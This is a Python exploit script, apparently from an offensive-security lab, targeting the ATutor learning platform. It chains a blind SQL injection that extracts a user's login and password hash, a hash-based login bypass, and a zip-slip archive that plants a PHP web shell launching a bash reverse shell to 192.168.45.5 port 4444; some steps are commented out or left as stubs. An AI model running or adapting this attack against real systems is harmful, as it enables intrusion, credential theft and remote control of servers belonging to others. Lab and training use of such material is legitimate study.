#!/usr/bin/python3
import requests
import sys
import hashlib
import requests
import zipfile
import time
from io import BytesIO

def searchFriends_sqli(ip, injection_string):
    #32 to 126 is the printable characters in the ASCII table
    for j in range(32,126):
        target="http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j 

    return None

def inject(r, inj, ip):
    extracted = ""
    
    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
        retrieved_value = searchFriends_sqli(ip, injection_string)

        if (retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break

    return extracted

def gen_hash(password, token):
	joined = password + token
	joined_hashed = hashlib.sha1(joined.encode("utf-8"))
	return str(joined_hashed.hexdigest())

def we_can_login_with_a_hash(ip, hash):
	target="http://%s/ATutor/login.php" % ip
	## Token is our own entirely made up value based on what we see in login_functions_inc.php
	token="hax"

	hashed=gen_hash(hash, token)
	d = {
		"form_password_hidden" : hashed,
		"form_login" : "teacher",
		"submit" : "Login",
		"token" : token
	}

	headers = { 
		"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
		"Referer" : "http://192.168.210.103/ATutor/mods/_standard/tests/index.php"
	}
	s = requests.Session()
	r = s.post(target, headers=headers, data=d, proxies={"http" : "http://localhost:8080"})

	headers = { 
		"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
		"Referer" : "http://192.168.210.103/ATutor/mods/_standard/tests/index.php",
		"Content-Type" : "application/zip"
	}



	result = r.text
	time.sleep(1)
	print("getting the course page")
	s.get("http://192.168.210.103/ATutor/bounce.php?course=16777215", proxies={"http" : "http://localhost:8080"})
	s.get("http://192.168.210.103/ATutor/mods/_standard/tests/import_test.php", proxies={"http" : "http://localhost:8080"})


	'''
	file = open("/home/kali/atutor/shell.zip", "rb")
	file_target = "http://192.168.210.103/ATutor/mods/_standard/tests/import_test.php"
	upload_data = {
		"name" : "submit_import",
		"submit_import" : "Import",
		"Content-Type" : "application/zip"
	}
	test_response = s.post(file_target, headers=headers, data=upload_data, files={"file": file}, proxies={"http" : "http://localhost:8080"})
	'''


	if "Create Course: My Start Page" in result or "My Courses: My Start Page" in result:
		return True
	return False

def build_zip():
	f = BytesIO()
	z = zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED)
	#z.writestr("poc/poc1.txt", "offsec")
	
	z.writestr("../../../../../var/www/html/ATutor/mods/shell999.php5", "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.45.5/4444 0>&1'\");?>")
	z.writestr("imsmanifest.xml", "invalid tag!")
	z.close()

	zip = open("shell.zip", "wb")
	zip.write(f.getvalue())
	zip.close()


def upload():
	target="http://192.168.210.103/ATutor/mods/_standard/tests/index.php"

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>") % sys.argv[0]
        print ("(+) eg: %s 192.168.211.203") % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
    username = "teacher"
    password = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
    '''
    print ("[+] Retrieving username...")
    query = "select/**/login/**/from/**/AT_members/**/WHERE/**/status=3/**/limit/**/1"
    username = inject(50, query, ip)

    print ("[+] Retrieving password hash...")
    query = "select/**/password/**/from/**/AT_members/**/WHERE/**/login=\'%s\'/**/limit/**/1" % (username)
    password = inject(50,query,ip)
	'''

    print ("[+] Credentials are: %s:%s" % (username, password))
 
    if we_can_login_with_a_hash(ip, hash):
    	print ("[+] Login Successful ...")
    else:
    	print ("[+] Could not login. Check password hash and ensure target is online.")
    	sys.exit(-1)

    print("[+] Creating Zip file and uploading...")
    #build_zip()
    print("[+] Uploading to target...")


    print ("\n[+] done")

if __name__ == "__main__":
    main()
